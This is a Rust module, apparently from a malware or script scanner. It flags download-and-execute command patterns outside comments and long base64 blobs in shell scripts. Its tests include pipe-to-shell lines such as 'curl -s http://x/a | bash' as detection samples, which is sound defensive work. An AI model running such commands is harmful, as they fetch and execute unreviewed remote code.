//! Script heuristics: command patterns, embedded encoded blobs.

use crate::patterns::{Pattern, command_indicators, snippet};

const SCRIPT_EXTS: &[&str] = &[
    "sh", "bash", "zsh", "ksh", "py", "pl", "rb", "php", "ps1", "psm1", "psd1", "bat", "cmd",
    "vbs", "vbe", "js", "jse", "wsf", "hta",
];
/// Script types in which a huge base64 run is unusual.
const BLOB_EXTS: &[&str] = &["sh", "bash", "ps1", "psm1", "bat", "cmd", "vbs", "vbe"];
const MAX_LINES: usize = 50_000;
const BLOB_RUN: usize = 4096;

#[derive(Debug, Default)]
pub(crate) struct ScriptFacts {
    /// Pattern kind, 1-based line number, matched fragment.
    pub(crate) matches: Vec<(Pattern, usize, String)>,
    pub(crate) blob: Option<(usize, usize)>,
}

/// Whether the file is a script: a `#!` line, or a script extension, and
/// text content (no NUL in the first 8 KiB).
pub(crate) fn is_script(name: &str, data: &[u8]) -> bool {
    let text = !data[..data.len().min(8192)].contains(&0);
    let ext = name.rsplit_once('.').map(|(_, e)| e.to_ascii_lowercase());
    text && (data.starts_with(b"#!") || ext.is_some_and(|e| SCRIPT_EXTS.contains(&e.as_str())))
}

fn is_comment(line: &str) -> bool {
    let l = line.trim_start();
    let lower = l.get(..4).map(str::to_ascii_lowercase).unwrap_or_default();
    (l.starts_with('#') && !l.starts_with("#!"))
        || l.starts_with("//")
        || l.starts_with("::")
        || l.starts_with('\'')
        || lower.starts_with("rem ")
        || l.starts_with("<#")
}

pub(crate) fn analyze(name: &str, data: &[u8]) -> ScriptFacts {
    let text = String::from_utf8_lossy(data);
    let mut f = ScriptFacts::default();
    for (i, line) in text.lines().take(MAX_LINES).enumerate() {
        if is_comment(line) {
            continue;
        }
        for (kind, matched) in command_indicators(line) {
            if !f.matches.iter().any(|(k, _, _)| *k == kind) {
                f.matches.push((kind, i + 1, snippet(matched)));
            }
        }
    }
    let ext = name
        .rsplit_once('.')
        .map(|(_, e)| e.to_ascii_lowercase())
        .unwrap_or_default();
    let shell = BLOB_EXTS.contains(&ext.as_str())
        || data.starts_with(b"#!/bin/sh")
        || data.starts_with(b"#!/bin/bash")
        || data.starts_with(b"#!/usr/bin/env bash");
    if shell {
        let mut run = 0usize;
        let mut line = 1usize;
        for &b in data {
            if b == b'\n' {
                line += 1;
            }
            if b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'=' {
                run += 1;
                if run >= BLOB_RUN {
                    f.blob = Some((line, run));
                    break;
                }
            } else {
                run = 0;
            }
        }
    }
    f
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_script_patterns_outside_comments() {
        let f = analyze("x.sh", b"#!/bin/sh\n# curl http://x | sh  (usage example)\necho hi\ncurl -s http://x/a | bash\n");
        assert_eq!(f.matches.len(), 1);
        assert_eq!(f.matches[0].0, Pattern::DownloadExec);
        assert_eq!(f.matches[0].1, 4);
        let blob = format!("#!/bin/sh\nP={}\n", "QUJD".repeat(1100));
        assert_eq!(analyze("x.sh", blob.as_bytes()).blob.map(|b| b.0), Some(2));
        let py = format!("P = '{}'\n", "QUJD".repeat(1100));
        assert!(analyze("x.py", py.as_bytes()).blob.is_none());
    }

    #[test]
    fn script_detection() {
        assert!(is_script("a", b"#!/usr/bin/env python3\n"));
        assert!(is_script("a.PS1", b"Write-Host hi"));
        assert!(!is_script("a.sh", b"\x7fELF\0\0"));
        assert!(!is_script("a.txt", b"curl x | sh"));
    }
}
